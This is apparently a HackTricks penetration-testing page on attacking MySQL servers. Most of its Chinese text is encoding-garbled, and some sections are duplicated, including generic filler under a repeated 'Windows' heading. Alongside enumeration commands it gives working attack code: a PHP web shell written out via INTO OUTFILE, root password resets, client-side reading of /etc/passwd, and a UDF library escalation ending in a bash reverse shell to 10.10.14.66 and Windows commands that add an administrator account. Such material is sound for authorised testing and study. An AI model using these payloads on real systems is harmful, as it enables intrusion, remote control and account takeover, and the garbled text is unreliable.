# 3306 - Pentesting Mysql

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## **åŸºæœ¬ä¿¡æ¯**

**MySQL**æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æºå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ï¼Œä½¿ç”¨ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼ˆ**SQL**ï¼‰ã€‚æ¥è‡ª[è¿™é‡Œ](https://www.siteground.com/tutorials/php-mysql/mysql/)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 3306
```
3306/tcp open  mysql
```
## **è¿æ¥**

### **æœ¬åœ°**
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### è¿œç¨‹

MySQL allows remote connections by default, which means that it can be accessed from other machines on the network. This can be a security risk if proper precautions are not taken.

MySQLé»˜è®¤å…è®¸è¿œç¨‹è¿æ¥ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ä»ç½‘ç»œä¸Šçš„å…¶ä»–è®¡ç®—æœºè®¿é—®ã€‚å¦‚æœä¸é‡‡å–é€‚å½“çš„é¢„é˜²æªæ–½ï¼Œè¿™å¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚

To secure remote access to MySQL, you can follow these steps:

è¦ä¿æŠ¤MySQLçš„è¿œç¨‹è®¿é—®å®‰å…¨ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š

1. **Bind MySQL to a specific IP address**: By default, MySQL listens on all available IP addresses. You can change this by modifying the `bind-address` parameter in the MySQL configuration file (`my.cnf`). Set it to the IP address you want MySQL to listen on.

   1. **å°†MySQLç»‘å®šåˆ°ç‰¹å®šçš„IPåœ°å€**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQLç›‘å¬æ‰€æœ‰å¯ç”¨çš„IPåœ°å€ã€‚æ‚¨å¯ä»¥é€šè¿‡ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶ï¼ˆ`my.cnf`ï¼‰ä¸­çš„`bind-address`å‚æ•°æ¥æ›´æ”¹æ­¤è®¾ç½®ã€‚å°†å…¶è®¾ç½®ä¸ºæ‚¨å¸Œæœ›MySQLç›‘å¬çš„IPåœ°å€ã€‚

2. **Create a firewall rule**: Configure your firewall to only allow incoming connections to the MySQL port (default is 3306) from trusted IP addresses or networks. This will prevent unauthorized access to the MySQL service.

   2. **åˆ›å»ºé˜²ç«å¢™è§„åˆ™**ï¼šé…ç½®é˜²ç«å¢™ï¼Œä»…å…è®¸æ¥è‡ªå—ä¿¡ä»»çš„IPåœ°å€æˆ–ç½‘ç»œçš„MySQLç«¯å£ï¼ˆé»˜è®¤ä¸º3306ï¼‰çš„å…¥ç«™è¿æ¥ã€‚è¿™å°†é˜²æ­¢æœªç»æˆæƒçš„è®¿é—®MySQLæœåŠ¡ã€‚

3. **Use strong passwords**: Ensure that all MySQL user accounts have strong, unique passwords. Avoid using default or easily guessable passwords.

   3. **ä½¿ç”¨å¼ºå¯†ç **ï¼šç¡®ä¿æ‰€æœ‰MySQLç”¨æˆ·å¸æˆ·éƒ½å…·æœ‰å¼ºå¤§ä¸”å”¯ä¸€çš„å¯†ç ã€‚é¿å…ä½¿ç”¨é»˜è®¤æˆ–å®¹æ˜“çŒœæµ‹çš„å¯†ç ã€‚

4. **Limit privileges**: Grant only the necessary privileges to MySQL user accounts. Avoid granting unnecessary privileges that could be exploited by an attacker.

   4. **é™åˆ¶æƒé™**ï¼šä»…å‘MySQLç”¨æˆ·å¸æˆ·æˆäºˆå¿…è¦çš„æƒé™ã€‚é¿å…æˆäºˆæ”»å‡»è€…å¯èƒ½åˆ©ç”¨çš„ä¸å¿…è¦çš„æƒé™ã€‚

5. **Enable SSL/TLS encryption**: Configure MySQL to use SSL/TLS encryption for secure communication between the client and the server. This will protect the data transmitted over the network from eavesdropping and tampering.

   5. **å¯ç”¨SSL/TLSåŠ å¯†**ï¼šé…ç½®MySQLä½¿ç”¨SSL/TLSåŠ å¯†è¿›è¡Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„å®‰å…¨é€šä¿¡ã€‚è¿™å°†ä¿æŠ¤é€šè¿‡ç½‘ç»œä¼ è¾“çš„æ•°æ®å…å—çªƒå¬å’Œç¯¡æ”¹ã€‚

By following these steps, you can enhance the security of your MySQL server and reduce the risk of unauthorized access or data breaches.
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## å¤–éƒ¨æšä¸¾

å…¶ä¸­ä¸€äº›æšä¸¾æ“ä½œéœ€è¦æœ‰æ•ˆçš„å‡­æ®
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#mysql)

### å†™å…¥ä»»ä½•äºŒè¿›åˆ¶æ•°æ®
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQLå‘½ä»¤**

MySQL is a popular open-source relational database management system. It is widely used in web applications and is known for its speed and reliability. In this section, we will explore some commonly used MySQL commands for database management and manipulation.

### **Connecting to MySQL**

To connect to a MySQL server, you can use the following command:

```bash
mysql -h <host> -u <username> -p
```

Replace `<host>` with the hostname or IP address of the MySQL server, `<username>` with the username, and `<password>` with the password.

### **Creating a Database**

To create a new database, use the `CREATE DATABASE` command:

```sql
CREATE DATABASE <database_name>;
```

Replace `<database_name>` with the desired name for the database.

### **Selecting a Database**

To select a database to work with, use the `USE` command:

```sql
USE <database_name>;
```

Replace `<database_name>` with the name of the database you want to select.

### **Creating a Table**

To create a new table in a database, use the `CREATE TABLE` command:

```sql
CREATE TABLE <table_name> (
    <column1_name> <column1_type>,
    <column2_name> <column2_type>,
    ...
);
```

Replace `<table_name>` with the desired name for the table, `<column1_name>` with the name of the first column, `<column1_type>` with the data type of the first column, and so on.

### **Inserting Data**

To insert data into a table, use the `INSERT INTO` command:

```sql
INSERT INTO <table_name> (<column1_name>, <column2_name>, ...)
VALUES (<value1>, <value2>, ...);
```

Replace `<table_name>` with the name of the table, `<column1_name>` and `<column2_name>` with the names of the columns you want to insert data into, and `<value1>`, `<value2>`, etc. with the corresponding values.

### **Querying Data**

To retrieve data from a table, use the `SELECT` command:

```sql
SELECT <column1_name>, <column2_name>, ...
FROM <table_name>
WHERE <condition>;
```

Replace `<column1_name>`, `<column2_name>`, etc. with the names of the columns you want to retrieve, `<table_name>` with the name of the table, and `<condition>` with the condition that the data must meet.

### **Updating Data**

To update data in a table, use the `UPDATE` command:

```sql
UPDATE <table_name>
SET <column1_name> = <new_value1>, <column2_name> = <new_value2>, ...
WHERE <condition>;
```

Replace `<table_name>` with the name of the table, `<column1_name>`, `<column2_name>`, etc. with the names of the columns you want to update, `<new_value1>`, `<new_value2>`, etc. with the new values, and `<condition>` with the condition that the data must meet.

### **Deleting Data**

To delete data from a table, use the `DELETE FROM` command:

```sql
DELETE FROM <table_name>
WHERE <condition>;
```

Replace `<table_name>` with the name of the table and `<condition>` with the condition that the data must meet.

### **Dropping a Database**

To drop a database, use the `DROP DATABASE` command:

```sql
DROP DATABASE <database_name>;
```

Replace `<database_name>` with the name of the database you want to drop.

### **Dropping a Table**

To drop a table, use the `DROP TABLE` command:

```sql
DROP TABLE <table_name>;
```

Replace `<table_name>` with the name of the table you want to drop.

These are just a few of the many commands available in MySQL. By mastering these commands, you will have a solid foundation for managing and manipulating databases using MySQL.
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQLæƒé™æšä¸¾

MySQLæ•°æ®åº“æ˜¯ä¸€ç§å¸¸ç”¨çš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”¨äºå­˜å‚¨å’Œç®¡ç†æ•°æ®ã€‚åœ¨è¿›è¡ŒMySQLæ¸—é€æµ‹è¯•æ—¶ï¼Œäº†è§£ç›®æ ‡æ•°æ®åº“çš„æƒé™è®¾ç½®éå¸¸é‡è¦ã€‚é€šè¿‡æšä¸¾MySQLæƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šå½“å‰ç”¨æˆ·çš„æƒé™çº§åˆ«ï¼Œå¹¶å°è¯•åˆ©ç”¨å¯èƒ½å­˜åœ¨çš„æƒé™æ¼æ´ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„MySQLæƒé™æšä¸¾æŠ€æœ¯ï¼š

#### 1. SHOW GRANTS

ä½¿ç”¨`SHOW GRANTS`è¯­å¥å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ã€‚è¿™å°†æ˜¾ç¤ºå½“å‰ç”¨æˆ·è¢«æˆäºˆçš„æ‰€æœ‰æƒé™ã€‚

```sql
SHOW GRANTS;
```

#### 2. INFORMATION_SCHEMA

MySQLçš„`INFORMATION_SCHEMA`æ•°æ®åº“å­˜å‚¨äº†å…³äºæ•°æ®åº“ã€è¡¨ã€åˆ—å’Œæƒé™çš„å…ƒæ•°æ®ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢`INFORMATION_SCHEMA`æ¥è·å–æœ‰å…³æƒé™çš„è¯¦ç»†ä¿¡æ¯ã€‚

```sql
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
```

#### 3. mysql.userè¡¨

`mysql.user`è¡¨åŒ…å«äº†MySQLç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€å¯†ç å’Œæƒé™ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢è¯¥è¡¨æ¥è·å–æœ‰å…³ç”¨æˆ·æƒé™çš„ä¿¡æ¯ã€‚

```sql
SELECT * FROM mysql.user;
```

#### 4. SHOW GRANTS FOR

ä½¿ç”¨`SHOW GRANTS FOR`è¯­å¥å¯ä»¥æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„æƒé™ã€‚å°†`<username>`æ›¿æ¢ä¸ºè¦æŸ¥è¯¢çš„ç”¨æˆ·åã€‚

```sql
SHOW GRANTS FOR <username>;
```

#### 5. mysql.dbè¡¨

`mysql.db`è¡¨å­˜å‚¨äº†æ•°æ®åº“çº§åˆ«çš„æƒé™ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢è¯¥è¡¨æ¥è·å–æœ‰å…³æ•°æ®åº“æƒé™çš„ä¿¡æ¯ã€‚

```sql
SELECT * FROM mysql.db;
```

#### 6. mysql.tables_privè¡¨

`mysql.tables_priv`è¡¨å­˜å‚¨äº†è¡¨çº§åˆ«çš„æƒé™ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢è¯¥è¡¨æ¥è·å–æœ‰å…³è¡¨æƒé™çš„ä¿¡æ¯ã€‚

```sql
SELECT * FROM mysql.tables_priv;
```

#### 7. mysql.columns_privè¡¨

`mysql.columns_priv`è¡¨å­˜å‚¨äº†åˆ—çº§åˆ«çš„æƒé™ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢è¯¥è¡¨æ¥è·å–æœ‰å…³åˆ—æƒé™çš„ä¿¡æ¯ã€‚

```sql
SELECT * FROM mysql.columns_priv;
```

é€šè¿‡ä½¿ç”¨è¿™äº›MySQLæƒé™æšä¸¾æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¥½åœ°äº†è§£ç›®æ ‡æ•°æ®åº“çš„æƒé™è®¾ç½®ï¼Œå¹¶å‘ç°å¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
æ‚¨å¯ä»¥åœ¨æ–‡æ¡£ä¸­æŸ¥çœ‹æ¯ä¸ªæƒé™çš„å«ä¹‰ï¼š[https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

### MySQLæ–‡ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

## MySQLå®¢æˆ·ç«¯ä»»æ„è¯»å–æ–‡ä»¶

å®é™…ä¸Šï¼Œå½“æ‚¨å°è¯•å°†**æ–‡ä»¶å†…å®¹**é€šè¿‡**å°†æ•°æ®åŠ è½½åˆ°è¡¨ä¸­**çš„æ–¹å¼å‘é€ç»™MySQLæˆ–MariaDBæœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¦æ±‚**å®¢æˆ·ç«¯è¯»å–æ–‡ä»¶å¹¶å‘é€å†…å®¹**ã€‚**å› æ­¤ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿç¯¡æ”¹MySQLå®¢æˆ·ç«¯ä»¥è¿æ¥åˆ°æ‚¨è‡ªå·±çš„MySQLæœåŠ¡å™¨ï¼Œæ‚¨å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚**\
è¯·æ³¨æ„ï¼Œè¿™æ˜¯ä½¿ç”¨ä»¥ä¸‹æ–¹å¼çš„è¡Œä¸ºï¼š
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
ï¼ˆæ³¨æ„åˆ°â€œlocalâ€è¿™ä¸ªè¯ï¼‰\
å› ä¸ºæ²¡æœ‰â€œlocalâ€ï¼Œä½ å¯èƒ½ä¼šå¾—åˆ°ï¼š
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**åˆå§‹ PoCï¼š**[**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**åœ¨è¿™ç¯‡è®ºæ–‡ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¯¹æ”»å‡»çš„å®Œæ•´æè¿°ï¼Œç”šè‡³å¦‚ä½•æ‰©å±•åˆ° RCEï¼š**[**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æ”»å‡»çš„æ¦‚è¿°ï¼š**[**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹èšä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql ç”¨æˆ·

å¦‚æœ mysql ä»¥ **root** èº«ä»½è¿è¡Œï¼Œé‚£å°†éå¸¸æœ‰è¶£ï¼š
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### mysqld.cnfçš„å±é™©è®¾ç½®

æ¥è‡ª[https://academy.hackthebox.com/module/112/section/1238](https://academy.hackthebox.com/module/112/section/1238)

| **è®¾ç½®**             | **æè¿°**                                                                                                                             |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `user`             | è®¾ç½®MySQLæœåŠ¡å°†ä»¥å“ªä¸ªç”¨æˆ·èº«ä»½è¿è¡Œã€‚                                                                                                     |
| `password`         | è®¾ç½®MySQLç”¨æˆ·çš„å¯†ç ã€‚                                                                                                                 |
| `admin_address`    | ç”¨äºç›‘å¬ç®¡ç†ç½‘ç»œæ¥å£ä¸Šçš„TCP/IPè¿æ¥çš„IPåœ°å€ã€‚                                                                                             |
| `debug`            | æ­¤å˜é‡æŒ‡ç¤ºå½“å‰çš„è°ƒè¯•è®¾ç½®ï¼ˆæ—¥å¿—ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼‰ã€‚                                                                                           |
| `sql_warnings`     | æ­¤å˜é‡æ§åˆ¶å•è¡ŒINSERTè¯­å¥åœ¨å‡ºç°è­¦å‘Šæ—¶æ˜¯å¦ç”Ÿæˆä¿¡æ¯å­—ç¬¦ä¸²ï¼ˆæ—¥å¿—ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼‰ã€‚                                                               |
| `secure_file_priv` | æ­¤å˜é‡ç”¨äºé™åˆ¶æ•°æ®å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œçš„å½±å“èŒƒå›´ã€‚                                                                                             |

### ç‰¹æƒå‡çº§
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### é€šè¿‡åº“è¿›è¡Œæƒé™æå‡

å¦‚æœ **mysql æœåŠ¡å™¨ä»¥ root ç”¨æˆ·**ï¼ˆæˆ–å…¶ä»–æ›´é«˜æƒé™ç”¨æˆ·ï¼‰è¿è¡Œï¼Œä½ å¯ä»¥è®©å®ƒæ‰§è¡Œå‘½ä»¤ã€‚ä¸ºæ­¤ï¼Œä½ éœ€è¦ä½¿ç”¨ **ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°**ã€‚è€Œè¦åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œä½ éœ€è¦ä¸€ä¸ªè¿è¡Œ mysql çš„æ“ä½œç³»ç»Ÿçš„ **åº“**ã€‚

å¯ä»¥åœ¨ sqlmap å’Œ metasploit ä¸­æ‰¾åˆ°è¦ä½¿ç”¨çš„æ¶æ„åº“ï¼Œæ–¹æ³•æ˜¯æ‰§è¡Œ **`locate "*lib_mysqludf_sys*"`** å‘½ä»¤ã€‚**`.so`** æ–‡ä»¶æ˜¯ **Linux** åº“ï¼Œ**`.dll`** æ˜¯ **Windows** åº“ï¼Œé€‰æ‹©ä½ éœ€è¦çš„é‚£ä¸ªã€‚

å¦‚æœä½  **æ²¡æœ‰** è¿™äº›åº“ï¼Œä½ å¯ä»¥ **å¯»æ‰¾å®ƒä»¬**ï¼Œæˆ–è€…ä¸‹è½½è¿™ä¸ª [**Linux C ä»£ç **](https://www.exploit-db.com/exploits/1518) å¹¶åœ¨ Linux å—æ¼æ´å½±å“çš„æœºå™¨ä¸Š **ç¼–è¯‘** å®ƒï¼š
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
ç°åœ¨ä½ å·²ç»æœ‰äº†åº“ï¼Œä½œä¸ºç‰¹æƒç”¨æˆ·ï¼ˆrootï¼Ÿï¼‰ç™»å½•åˆ°Mysqlä¸­ï¼Œç„¶åæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### Windows

#### Windows

MySQL can be installed on Windows using the official installer available on the MySQL website. Once installed, the MySQL service will be running in the background.

To connect to the MySQL server on Windows, you can use the MySQL Command Line Client or a graphical user interface (GUI) tool like MySQL Workbench.

To access the MySQL Command Line Client, open the Command Prompt and type `mysql -u <username> -p`. Replace `<username>` with the username you want to use to connect to the MySQL server. You will be prompted to enter the password for the specified username.

To use a GUI tool like MySQL Workbench, you will need to download and install it from the MySQL website. Once installed, open MySQL Workbench and click on the "+" icon in the "MySQL Connections" section to create a new connection. Enter the necessary details like the connection name, hostname, port, username, and password, and click "Test Connection" to verify the connection.

Once connected to the MySQL server, you can perform various tasks like creating databases, tables, and executing SQL queries.

#### Windows

MySQLå¯ä»¥ä½¿ç”¨MySQLå®˜æ–¹ç½‘ç«™ä¸Šæä¾›çš„å®˜æ–¹å®‰è£…ç¨‹åºåœ¨Windowsä¸Šå®‰è£…ã€‚å®‰è£…å®Œæˆåï¼ŒMySQLæœåŠ¡å°†åœ¨åå°è¿è¡Œã€‚

è¦è¿æ¥åˆ°Windowsä¸Šçš„MySQLæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨MySQLå‘½ä»¤è¡Œå®¢æˆ·ç«¯æˆ–å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰å·¥å…·ï¼Œå¦‚MySQL Workbenchã€‚

è¦è®¿é—®MySQLå‘½ä»¤è¡Œå®¢æˆ·ç«¯ï¼Œè¯·æ‰“å¼€å‘½ä»¤æç¤ºç¬¦å¹¶é”®å…¥`mysql -u <username> -p`ã€‚å°†`<username>`æ›¿æ¢ä¸ºè¦ç”¨äºè¿æ¥åˆ°MySQLæœåŠ¡å™¨çš„ç”¨æˆ·åã€‚ç„¶åï¼Œæ‚¨å°†è¢«æç¤ºè¾“å…¥æŒ‡å®šç”¨æˆ·åçš„å¯†ç ã€‚

è¦ä½¿ç”¨MySQL Workbenchç­‰GUIå·¥å…·ï¼Œæ‚¨éœ€è¦ä»MySQLç½‘ç«™ä¸‹è½½å¹¶å®‰è£…å®ƒã€‚å®‰è£…å®Œæˆåï¼Œæ‰“å¼€MySQL Workbenchï¼Œå•å‡»â€œMySQL Connectionsâ€éƒ¨åˆ†çš„â€œ+â€å›¾æ ‡ä»¥åˆ›å»ºæ–°è¿æ¥ã€‚è¾“å…¥å¿…è¦çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚è¿æ¥åç§°ã€ä¸»æœºåã€ç«¯å£ã€ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åå•å‡»â€œTest Connectionâ€ä»¥éªŒè¯è¿æ¥ã€‚

è¿æ¥åˆ°MySQLæœåŠ¡å™¨åï¼Œæ‚¨å¯ä»¥æ‰§è¡Œå„ç§ä»»åŠ¡ï¼Œå¦‚åˆ›å»ºæ•°æ®åº“ã€è¡¨å’Œæ‰§è¡ŒSQLæŸ¥è¯¢ã€‚
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### ä»æ–‡ä»¶ä¸­æå–MySQLå‡­æ®

